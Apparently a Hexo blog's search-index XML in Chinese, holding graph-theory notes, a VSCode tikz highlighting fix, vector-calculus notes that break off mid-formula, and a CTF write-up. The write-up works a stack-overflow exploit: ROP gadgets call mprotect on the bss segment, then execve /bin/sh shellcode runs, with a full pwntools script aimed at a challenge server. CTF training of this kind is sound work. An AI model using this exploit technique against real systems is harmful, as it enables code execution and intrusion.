<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>离散数学————图论总结归纳</title>
    <link href="/2024/05/30/discrete-mathematics-graph-theory/"/>
    <url>/2024/05/30/discrete-mathematics-graph-theory/</url>
    
    <content type="html"><![CDATA[<h1 id="图论">图论</h1><h2 id="图的基本概念">图的基本概念</h2><h3 id="图的集合表示">图的集合表示</h3><p>图的表示 <span class="math inline">\(G(V,E)\)</span> ，其中 <spanclass="math inline">\(V\)</span> 为顶点集， <spanclass="math inline">\(E\)</span>为边集，都为有限集.边集可以使有向边集，也可以是无向边集.</p><p><span class="math inline">\(V(G)\)</span>，<spanclass="math inline">\(E(G)\)</span> 表示图 <spanclass="math inline">\(G\)</span> 的顶点集和边集.</p><p>有序边的表示方法为 <span class="math inline">\(e_i\)</span> 或者<span class="math inline">\(&lt;v_i,v_j&gt;\)</span>，无序边的表示方法为 <span class="math inline">\(e_i\)</span> 或 <spanclass="math inline">\((v_i,v_j)\)</span>.</p><h3 id="其他一些基本概念">其他一些基本概念</h3><ul><li>阶：顶点数，有 <span class="math inline">\(n\)</span> 个顶点即为<span class="math inline">\(n\)</span> 阶图.</li><li>零图：一条边也没有的图.<span class="math inline">\(n\)</span>阶零图记为 <spanclass="math inline">\(N_n\)</span>.一阶零图称为<strong>平凡图</strong></li><li>空图：在运算中产生 <span class="math inline">\(V\)</span>为空的情况，记为 <span class="math inline">\(\varnothing\)</span>.</li><li>基图：有向图变无向图称它的基图</li><li>环：<ul><li>无向图中，<span class="math inline">\(e_k=(v_i,v_j)\)</span> ，称<span class="math inline">\(e_k\)</span> 与 <spanclass="math inline">\(v_i\)</span>（或 <spanclass="math inline">\(v_j\)</span> ）关联；若 <spanclass="math inline">\(v_i=v_j\)</span> 则关联次数为 <spanclass="math inline">\(2\)</span> ，否则为 <spanclass="math inline">\(1\)</span>. 不关联则为 <spanclass="math inline">\(0\)</span>.</li><li>有向图中，有始终点之分.</li><li>在两种图中，有 <span class="math inline">\(v_i=v_j\)</span> 则称<span class="math inline">\(e_k\)</span> 为<strong>环</strong>.</li></ul></li><li>相邻：点有边连接，边有点连接，称这两个点（边）相邻.</li><li><strong>简单图</strong>：既不含平行边，也不含环的图，称为简单图.含平行边的为多重图.<ul><li>在无向图，平行边只需要同连接两个顶点；在有向图中，平行边需要<strong>方向相同</strong>.</li><li>平行边的条数称为重数. <pre><code class=" mermaid">graph LRsubgraph 不是平行边direction LRa((v1))b((v2))a--&gt;bb--&gt;aendsubgraph 是平行边direction LRc((v1))d((v2))c--&gt;dc--&gt;dend不是平行边 &lt;---&gt; 是平行边</code></pre></li></ul></li><li>度：记 <span class="math inline">\(G\)</span> 为无向图， <spanclass="math inline">\(D\)</span> 为有向图. 则 <spanclass="math inline">\(v\)</span> 作为端点的次数为度数，记为 <spanclass="math inline">\(d_G(v)\)</span>. 有向图中分出度和入度，分别记为<span class="math inline">\(d_D^+(v)\)</span> 和 <spanclass="math inline">\(d_D^-(v)\)</span>. （<em>出为 <spanclass="math inline">\(+\)</span> ，入为 <spanclass="math inline">\(-\)</span> ，正好与电磁学中的通量相反</em>）<ul><li>最大度：<span class="math inline">\(\Delta (G)\)</span> ，<spanclass="math inline">\(\Delta (D)\)</span></li><li>最小度：<span class="math inline">\(\delta (G)\)</span> ，<spanclass="math inline">\(\delta (D)\)</span></li><li>最大/小出度：<span class="math inline">\(\Delta ^+(D)\)</span>，<span class="math inline">\(\delta ^+ (D)\)</span></li><li>最大/小入度：<span class="math inline">\(\Delta ^-(D)\)</span>，<span class="math inline">\(\delta ^- (D)\)</span></li></ul></li><li>悬挂顶点：度数为 <spanclass="math inline">\(1\)</span>，与之关联的边为悬挂边.</li><li>奇度顶点/偶度顶点：无需解释.</li><li>握手定理</li><li>同构（<span class="math inline">\(\cong\)</span>）</li><li>彼得松图</li><li>完全图：<span class="math inline">\(G\)</span> 为 <spanclass="math inline">\(n\)</span> 阶无向简单图，每个顶点都与其余 <spanclass="math inline">\(n-1\)</span> 个顶点相连，则 <spanclass="math inline">\(G\)</span> 为 <spanclass="math inline">\(n\)</span> 阶（无向）完全图，记为 <spanclass="math inline">\(K_n\)</span>；若为有向图，则为 <spanclass="math inline">\(n\)</span> 阶有向完全图.</li><li><span class="math inline">\(n\)</span> 阶竞赛图：<spanclass="math inline">\(n\)</span> 阶有向简单图 <spanclass="math inline">\(D\)</span> 的基图为 <spanclass="math inline">\(n\)</span>阶无向完全图 <spanclass="math inline">\(K_n\)</span> ，则称 <spanclass="math inline">\(D\)</span> 为 <spanclass="math inline">\(n\)</span> 阶竞赛图.</li><li><span class="math inline">\(k-\)</span>正则图：<spanclass="math inline">\(G\)</span> 为 <spanclass="math inline">\(n\)</span> 阶无向简单图，那么 <spanclass="math inline">\(\forall v \in V(G), d(v)=k\)</span> .</li><li>子图、母图、真子图、生成子图：对应子集、原集、真子集、点集相等的子集.</li></ul>]]></content>
    
    
    <categories>
      
      <category>数理基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>离散数学</tag>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Guessing Game 1</title>
    <link href="/2024/04/18/ucas-ctf-pwn-guessing-name-1/"/>
    <url>/2024/04/18/ucas-ctf-pwn-guessing-name-1/</url>
    
    <content type="html"><![CDATA[<h1 id="guessing-game-1">Guessing Game 1</h1><p>关于 <code>mprotect</code> 函数的应用（其实完全可以用系统调用）</p><span id="more"></span><h2 id="x01-常规看看">0x01 常规看看</h2><p>题目给了三个文件，通过makefile可知程序是静态编译</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c<br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">[*] <span class="hljs-string">&#x27;/home/kali/ctf/pwn/q36_guessing_game_1/vuln&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found <br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure><p>事实上这次checksec有些不准，应没有canary</p><p>没开启栈保护</p><p>读源码发现存在栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFSIZE 100</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">win</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> winner[BUFSIZE];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New winner!\nName? &quot;</span>);<br>fgets(winner, <span class="hljs-number">360</span>, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congrats %s\n\n&quot;</span>, winner);<br>&#125;<br></code></pre></td></tr></table></figure><p>此外，由于没有设种，随机数是伪随机数，另写一个程序便可知其随机数序列（要用linux编译运行）,这样我们就可以轻松利用这个漏洞了</p><h2 id="x02-初步分析">0x02 初步分析</h2><p>程序中没有 <code>system()</code> 函数和 <code>/bin/sh</code>字符串，又是静态编译，无法像之前那样通过libc获取，只能使用shellcode了</p><p>但程序中栈不可执行，且无法得知栈的确切位置，只能通过别的方法注入shellcode</p><p>想到用shellcode覆盖一段bss段数据，然后将返回地址覆盖到该段执行shellcode。用gdb的<code>vmmap</code>命令查看，bss段可读可写不可执行，所以要想执行shellcode，就先要把bss段修改为可读可写可执行权限。</p><p>这里需要用到 <code>mprotect()</code> 函数。</p><h2 id="x03-mprotect">0x03 mprotect()</h2><p>linux中 <code>mprotect()</code>可以用来修改一段指定内存区域的保护属性</p><p>函数原型： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>   </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mmap.h&gt;</span>   </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *start, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span>;<br></code></pre></td></tr></table></figure></p><p>参数：</p><ul><li><code>start</code>修改权限开始地址，必须是一个内存页的起始地址，一页为<code>0x1000</code></li><li><code>len</code> 修改长度</li><li><code>prot</code> 权限属性<ul><li><code>PROT_READ=4</code> 可读</li><li><code>PROT_WRITE=2</code> 可写</li><li><code>PROT_EXEC=1</code> 可执行</li><li><code>PROT_NONE=0</code> 没有以上三种权限</li></ul></li></ul><p>返回值：</p><ul><li><code>0</code> success</li><li><code>-1</code> fail, 并且系统调用错误码被覆盖</li></ul><p>如果对内存进行不合权限的操作，内核会产生<code>Segmentation fault</code></p><p>这里我们希望bss段可读可写可执行，应将 <code>prot</code> 置为<code>7</code></p><h2 id="x04-pwn-it">0x04 Pwn it！</h2><p>由于是64位程序，传6个以内的参数依次由<code>rdi,rsi,rdx,rcx,r8,r9</code>进行，所以我们首先要找<code>gadget</code> ，即形如 <code>pop rdi;ret</code>的小片段以进行参数传递</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sh">ROPgadget --binary vuln --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep -E <span class="hljs-string">&quot;rdi|rsi|rdx&quot;</span><br><br>0x0000000000482776 : pop rax ; pop rdx ; pop rbx ; ret<br>0x00000000004026f5 : pop rdi ; pop rbp ; ret<br>0x0000000000400696 : pop rdi ; ret<br>0x000000000047099d : pop rdi ; ret 0xfffd<br>0x000000000044cc24 : pop rdx ; pop r10 ; ret<br>0x0000000000482777 : pop rdx ; pop rbx ; ret<br>0x000000000044cc49 : pop rdx ; pop rsi ; ret<br>0x000000000044cc26 : pop rdx ; ret<br>0x00000000004026f3 : pop rsi ; pop r15 ; pop rbp ; ret<br>0x0000000000400694 : pop rsi ; pop r15 ; ret<br>0x000000000041025e : pop rsi ; pop rbp ; ret<br>0x0000000000410ca3 : pop rsi ; ret<br></code></pre></td></tr></table></figure><p>于是可以在处理好随机数后构造 <code>payload1</code> ，给bss段提权</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">rdi_addr=<span class="hljs-number">0x0000000000400696</span><br>rsi_addr=<span class="hljs-number">0x0000000000410ca3</span><br>rdx_addr=<span class="hljs-number">0x000000000044cc26</span><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(buf_size)+p64(rdx_addr)+p64(buf_prot)+p64(mprotect_addr)+p64(main_addr)<br></code></pre></td></tr></table></figure><p>接着在下一轮中用 <code>read</code> 读入shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(<span class="hljs-number">0</span>)+p64(rsi_addr)+p64(shellcode_addr)+p64(rdx_addr)+p64(<span class="hljs-number">29</span>)+p64(read_addr)+p64(main_addr)<br></code></pre></td></tr></table></figure><p>最后再执行shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(shellcode_addr)<br></code></pre></td></tr></table></figure><h2 id="x05-exp">0x05 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>ip=<span class="hljs-string">&quot;124.16.75.117&quot;</span><br>port=<span class="hljs-number">51001</span><br>conn=connect(ip,port)<br><span class="hljs-comment">#conn=process(&quot;./pwn/q36_guessing_game_1/vuln&quot;)</span><br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span><br>bss_addr=<span class="hljs-number">0x00000000006BC000</span><br>mprotect_addr=<span class="hljs-number">0x000000000044B480</span><br>buf_size=<span class="hljs-number">0x1000</span><br>buf_prot=<span class="hljs-number">0x7</span><br>rdi_addr=<span class="hljs-number">0x0000000000400696</span><br>rsi_addr=<span class="hljs-number">0x0000000000410ca3</span><br>rdx_addr=<span class="hljs-number">0x000000000044cc26</span><br>return_addr=<span class="hljs-number">0x0000000000400CEE</span><br>main_addr=<span class="hljs-number">0x0000000000400C8C</span><br>write_addr=<span class="hljs-number">0x000000000044A770</span><br>read_addr=<span class="hljs-number">0x000000000044A6A0</span><br>shellcode_addr=<span class="hljs-number">0x00000000006BC554</span><br>shellcode=<span class="hljs-string">b&#x27;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span><br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&quot;What number would you like to guess?\n&quot;</span>))<br>conn.sendline(<span class="hljs-string">b&#x27;84&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&#x27;!\nName?&#x27;</span>))<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(bss_addr)+p64(rsi_addr)+p64(buf_size)+p64(rdx_addr)+p64(buf_prot)+p64(mprotect_addr)+p64(main_addr)<br>conn.sendline(payload1)<br><br><br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&quot;What number would you like to guess?\n&quot;</span>))<br>conn.sendline(<span class="hljs-string">b&#x27;87&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&#x27;!\nName?&#x27;</span>))<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(rdi_addr)+p64(<span class="hljs-number">0</span>)+p64(rsi_addr)+p64(shellcode_addr)+p64(rdx_addr)+p64(<span class="hljs-number">29</span>)+p64(read_addr)+p64(main_addr)<br>conn.sendline(payload2)<br>conn.send(shellcode)<br><br><br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&quot;What number would you like to guess?\n&quot;</span>))<br>conn.sendline(<span class="hljs-string">b&#x27;78&#x27;</span>)<br><span class="hljs-built_in">print</span>(conn.recvuntil(<span class="hljs-string">b&#x27;!\nName?&#x27;</span>))<br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(shellcode_addr)<br>conn.sendline(payload3)<br>conn.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="x06-其他的做法">0x06 其他的做法</h2><p><ahref="https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/guessing-game-1/">GuessingGame 1 | 7Rocky</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf_pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决vscode无法对markdown源码中新定义语言(tikz)高亮的问题</title>
    <link href="/2024/03/08/how-to-use-tikz-in-your-blog/"/>
    <url>/2024/03/08/how-to-use-tikz-in-your-blog/</url>
    
    <content type="html"><![CDATA[<h1id="解决vscode无法对markdown源码中新定义语言tikz高亮的问题">解决vscode无法对markdown源码中新定义语言(tikz)高亮的问题</h1><h2 id="问题原因">问题原因</h2><p>刚刚配置了可用在hexo用于画图的tikz插件（hexo-filter-tikzjax），链接如下：<ahref="https://prinsss.github.io/graphics-with-tikz-in-hexo/">使用 TikZ在 Hexo 博客中愉快地画图</a></p><p>其中插入的代码要这样写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-code">```tikz</span><br><span class="hljs-code">\begin&#123;document&#125;</span><br><span class="hljs-code">\begin&#123;tikzpicture&#125;</span><br><span class="hljs-code">......</span><br><span class="hljs-code">\end&#123;tikzpicture&#125;</span><br><span class="hljs-code">\end&#123;document&#125;</span><br><span class="hljs-code">```</span><br></code></pre></td></tr></table></figure><p>但这样的话，vscode就无法将其识别为latex语言而不进行高亮，如下图</p><figure><img src="1709906298379.png" alt="无法高亮" /><figcaption aria-hidden="true">无法高亮</figcaption></figure><p>所以必须要修改vscode配置文件</p><h2 id="解决方法">解决方法</h2><p>vscode编辑器的语法高亮储存在 <code>.tmLanguage.json</code>文件中，可以在电脑中搜索 <code>markdown.tmLanguage.json</code>，我们只需要在latex高亮的提示词前面加上tikz即可。</p><figure><img src="1709907723213.png" alt="高亮" /><figcaption aria-hidden="true">高亮</figcaption></figure><p>重启vscode，就可以看到了高亮的代码了。成果图如下</p><figure><img src="1709915675551.png" alt="成果" /><figcaption aria-hidden="true">成果</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>配置问题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>tikz</tag>
      
      <tag>vscode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数理杂记</title>
    <link href="/2024/03/06/some-math-notes/"/>
    <url>/2024/03/06/some-math-notes/</url>
    
    <content type="html"><![CDATA[<h1 id="数理杂记">数理杂记</h1><h2 id="nabla-运算规则推导"><span class="math inline">\(\nabla\)</span>运算规则推导</h2><p><span class="math display">\[\boldsymbol{def}\quad \varphi, \phi 为标量函数,\boldsymbol{f},\boldsymbol{g} 为矢量函数\]</span></p><p>注意由 <span class="math inline">\(\nabla\)</span>算符的微分性和矢量性，可像正常求导一样写出下一步，在进行矢量运算</p><p><span class="math display">\[\begin{align}\nabla (\varphi \phi)&amp;=\nabla (\varphi_c \phi)+\nabla(\varphi\phi_c)\\&amp;=\varphi\nabla\phi+\phi\nabla\varphi\end{align}\]</span></p><p><span class="math display">\[\begin{align}\nabla \cdot(\varphi \boldsymbol{f})&amp;=\nabla \cdot(\varphi_c\boldsymbol{f})+\nabla \cdot(\varphi \boldsymbol{f}_c) \\&amp;=\varphi\nabla \cdot \boldsymbol{f}+\nabla \varphi \cdot \boldsymbol{f}\end{align}\]</span></p><p><span class="math display">\[\begin{align}\nabla \times (\varphi \boldsymbol{f})&amp;=\nabla \times (\varphi_c\boldsymbol{f})+\nabla \times (\varphi \boldsymbol{f}_c) \\&amp;=\varphi\nabla\times \boldsymbol{f}+\nabla \varphi\times \boldsymbol{f}\end{align}\]</span></p><p><span class="math display">\[\begin{align}\nabla \cdot (\boldsymbol{f}\times\boldsymbol{g})&amp;=\nabla\cdot(\boldsymbol{f}_c\times\boldsymbol{g})+\nabla\cdot(\boldsymbol{f}\times\boldsymbol{g}_c)\\&amp;=-\boldsymbol{f}_c\cdot(\nabla\times\boldsymbol{g})+\boldsymbol{g}_c(\nabla\times\boldsymbol{f})\\&amp;=-\boldsymbol{f}\cdot(\nabla\times\boldsymbol{g})+\boldsymbol{g}\cdot(\nabla\times \boldsymbol{f})\end{align}\]</span></p><div class="note note-warning">            <p>这个式子第二步化简是用混合积的轮换对称性，将 <spanclass="math inline">\(\nabla\)</span> 作用在该作用的地方，不要出现 <spanclass="math inline">\(\nabla\)</span> 作用在最右边，如 <spanclass="math inline">\(\boldsymbol{f}\cdot(\boldsymbol{g}\times\nabla)\)</span></p>          </div><p><span class="math display">\[\begin{align}\nabla\times (\boldsymbol{f}\times \boldsymbol{g})&amp;=\nabla \times(\boldsymbol{f}_c\times \boldsymbol{g})+\nabla\times(\boldsymbol{f}\times \boldsymbol{g}_c)\\&amp;=(\nabla\cdot\boldsymbol{g})\boldsymbol{f}_c-(\boldsymbol{f}_c\cdot\nabla)\boldsymbol{g}+(\boldsymbol{g}_c\cdot\nabla)\boldsymbol{f}-(\nabla\cdot\boldsymbol{f})\boldsymbol{g}_c\\&amp;= (\nabla\cdot\boldsymbol{g})\boldsymbol{f}-(\boldsymbol{f}\cdot\nabla)\boldsymbol{g}+(\boldsymbol{g}\cdot\nabla)\boldsymbol{f}-(\nabla\cdot\boldsymbol{f})\boldsymbol{g}\end{align}\]</span></p><div class="note note-warning">            <p>上面最后一个式子前两项由 <span class="math inline">\(\nabla \times(\boldsymbol{f}_c\times \boldsymbol{g})\)</span> 展开，后两项由 <spanclass="math inline">\(\nabla\times (\boldsymbol{f}\times\boldsymbol{g}_c)\)</span> 展开</p>          </div><p>下面化简如下式子 <spanclass="math inline">\(\nabla(\boldsymbol{f}\cdot\boldsymbol{g})\)</span>，需要有一个引例</p><p>由矢量运算可知</p><p><span class="math display">\[\boldsymbol{A}\times (\boldsymbol{B}\times\boldsymbol{C})=(\boldsymbol{A}\cdot\boldsymbol{C})\boldsymbol{B}-(\boldsymbol{A}\cdot\boldsymbol{B})\boldsymbol{C}\]</span></p><p>那么就有</p><p><span class="math display">\[\boldsymbol{B}(\boldsymbol{A}\cdot \boldsymbol{C})=\boldsymbol{A}\times(\boldsymbol{B}\times \boldsymbol{C})+(\boldsymbol{A}\cdot\boldsymbol{B})\boldsymbol{C}\]</span></p><p>将上式 <spanclass="math inline">\(\boldsymbol{C}=\nabla\)</span>即可得到下述式子</p><p><span class="math display">\[\begin{align}\nabla(\boldsymbol{f}\cdot\boldsymbol{g})&amp;=\nabla(\boldsymbol{f}_c\cdot\boldsymbol{g})+\nabla(\boldsymbol{f}\cdot\boldsymbol{g}_c)\\&amp;=\boldsymbol{f}_c\times(\nabla\times  \boldsymbol{g})+(\boldsymbol{f}_c\cdot\nabla)\boldsymbol{g}+\boldsymbol{g}_c\times(\nabla\times  \boldsymbol{f})+(\boldsymbol{g}\cdot\nabla)\boldsymbol{f}\\&amp;=\boldsymbol{f}\times(\nabla\times  \boldsymbol{g})+(\boldsymbol{f}\cdot\nabla)\boldsymbol{g}+\boldsymbol{g}\times(\nabla\times  \boldsymbol{f})+(\boldsymbol{g}\cdot\nabla)\boldsymbol{f}\end{align}\]</span></p><h2 id="球坐标系与直角坐标系的变换">球坐标系与直角坐标系的变换</h2><h3 id="坐标变换">坐标变换</h3><p>直角系到球坐标系</p><p><span class="math display">\[\begin{align}x&amp;=r\sin \theta \cos \phi \\ y&amp;=r \sin \theta \sin \phi \\z&amp;=r \cos \theta\end{align}\]</span></p><p>球坐标系到直角坐标系</p><p><span class="math display">\[\begin{align}r&amp;=\sqrt{x^2+y^2+z^2} \\ \theta &amp;=\arccos\frac{z}{\sqrt{x^2+y^2+z^2}} \\ \phi &amp;= \arctan \frac{y}{x}\end{align}\]</span></p><h3 id="基矢变换">基矢变换</h3><p>写出 <spanclass="math inline">\((\boldsymbol{\hat{r}},\boldsymbol{\hat{\theta}},\boldsymbol{\hat{\phi}})\)</span>在 <spanclass="math inline">\((\boldsymbol{\hat{x}},\boldsymbol{\hat{y}},\boldsymbol{\hat{z}})\)</span>下的坐标</p><p><span class="math display">\[\begin{align}\boldsymbol{\hat{r}}&amp;=(1,\theta,\phi) \\\boldsymbol{\hat{\theta}}&amp;=(1,\theta+\frac{\pi}{2},\phi) \\\boldsymbol{\hat{\phi}}&amp;=(1,\frac{\pi}{2},\phi+\frac{\pi}{2})\end{align}\]</span></p><p>由此，可以由坐标变换写出 <spanclass="math inline">\((\boldsymbol{\hat{r}},\boldsymbol{\hat{\theta}},\boldsymbol{\hat{\phi}})\)</span>到 <spanclass="math inline">\((\boldsymbol{\hat{x}},\boldsymbol{\hat{y}},\boldsymbol{\hat{z}})\)</span>的变换矩阵</p><p><span class="math display">\[\begin{pmatrix} \boldsymbol{\hat{r}} \\ \boldsymbol{\hat{\theta}} \\\boldsymbol{\hat{\phi}} \\\end{pmatrix} =\begin{pmatrix} \sin \theta \cos \phi &amp; \sin \theta \sin \phi&amp;  \cos \theta \\ \cos \theta \cos \phi &amp; \cos \theta \sin \phi&amp; -\sin \theta \\ -\sin \phi &amp; \cos \phi &amp; 0 \\\end{pmatrix}\begin{pmatrix} \boldsymbol{\hat{x}} \\ \boldsymbol{\hat{y}} \\\boldsymbol{\hat{z}} \\\end{pmatrix}\]</span></p><p>要求从 <spanclass="math inline">\((\boldsymbol{\hat{x}},\boldsymbol{\hat{y}},\boldsymbol{\hat{z}})\)</span>到 <spanclass="math inline">\((\boldsymbol{\hat{r}},\boldsymbol{\hat{\theta}},\boldsymbol{\hat{\phi}})\)</span>的变换，即求上述矩阵的逆</p><p>由于该矩阵式正交的，所以 <spanclass="math inline">\(A^{-1}=A^{\mathrm{T}}\)</span> （<ahref="https://zhuanlan.zhihu.com/p/684677360">通俗易懂：什么是正交矩阵</a>）</p><p>则有</p><p><span class="math display">\[\begin{pmatrix} \boldsymbol{\hat{x}} \\ \boldsymbol{\hat{y}} \\\boldsymbol{\hat{z}} \\\end{pmatrix}=\begin{pmatrix} \sin \theta \cos\phi &amp; \cos \theta \cos \phi &amp; -\sin \phi   \\ \sin \theta \sin\phi &amp; \cos \theta \sin \phi  &amp; \cos \phi \\ \cos \theta &amp;-\sin \theta &amp; 0 \\\end{pmatrix} \begin{pmatrix}\boldsymbol{\hat{r}} \\ \boldsymbol{\hat{\theta}} \\\boldsymbol{\hat{\phi}} \\\end{pmatrix}\]</span></p><h2 id="三维正交曲线坐标系-uvw-的梯度散度旋度">三维正交曲线坐标系 <spanclass="math inline">\((u,v,w)\)</span> 的梯度、散度、旋度</h2><h3 id="前置内容">前置内容</h3><p>现在我们用 <span class="math inline">\((u,v,w)\)</span>来代替直角坐标系中的 <span class="math inline">\((x, y, z)\)</span>、球坐标系中的 <span class="math inline">\((r,\theta,\phi)\)</span>、柱坐标系的 <span class="math inline">\((s,\theta,z)\)</span>，以得到普遍性的结果。其中这三个单位矢量正交，且 <spanclass="math inline">\(\boldsymbol{\hat{u}},\boldsymbol{\hat{v}},\boldsymbol{\hat{w}}\)</span>指坐标增加的方向。值得注意的是，这三个单位矢量都是位置的函数，因为其方向随坐标的变化而变化。由此，我们可以给出从<span class="math inline">\((u,v,w)\)</span> 到 <spanclass="math inline">\((u+\mathrm{d}u,v+\mathrm{d}v,w+\mathrm{d}w)\)</span>的无穷小位移</p><p><span class="math display">\[\mathrm{d}\boldsymbol{l}=f\mathrm{d}u \boldsymbol{\hat{u}}+g\mathrm{d}v\boldsymbol{\hat{v}}+h\mathrm{d}w \boldsymbol{\hat{w}}\]</span></p><p>其中 <span class="math inline">\(f,g,h\)</span>是描述单位矢量随坐标变化的函数。</p><div class="note note-success">            <p>例如，直角坐标系是 <span class="math inline">\((1,1,1)\)</span>，而球坐标系是 <span class="math inline">\((1,r,r\sin\theta)\)</span></p>          </div><h3 id="梯度">梯度</h3><p>现在假设有一个标量场 <span class="math inline">\(t(u,v,w)\)</span>，当有一个点位移了一个 <spanclass="math inline">\(\mathrm{d}\boldsymbol{l}\)</span> 时，标量场 <spanclass="math inline">\(t\)</span> 有变化</p><p><span class="math display">\[\mathrm{d}t=\frac{\partial t}{\partial u}\mathrm{d}u+\frac{\partialt}{\partial v}\mathrm{d}v+\frac{\partial t}{\partial w}\mathrm{d}w\]</span></p><p>由梯度的定义可知，</p><p><span class="math display">\[\mathrm{d}t=\nabla t \cdot \mathrm{d}\boldsymbol{l}=(\nabla t)_uf\mathrm{d}u+(\nabla t)_v g\mathrm{d}v+(\nabla t)_w h\mathrm{d}w\]</span></p><p>其中 <span class="math inline">\((\nabla t)_u\)</span> 为 <spanclass="math inline">\(t\)</span> 的梯度在 <spanclass="math inline">\(\boldsymbol{\hat{u}}\)</span> 方向的分量</p><p>对比前两式，我们可得</p><p><span class="math display">\[(\nabla 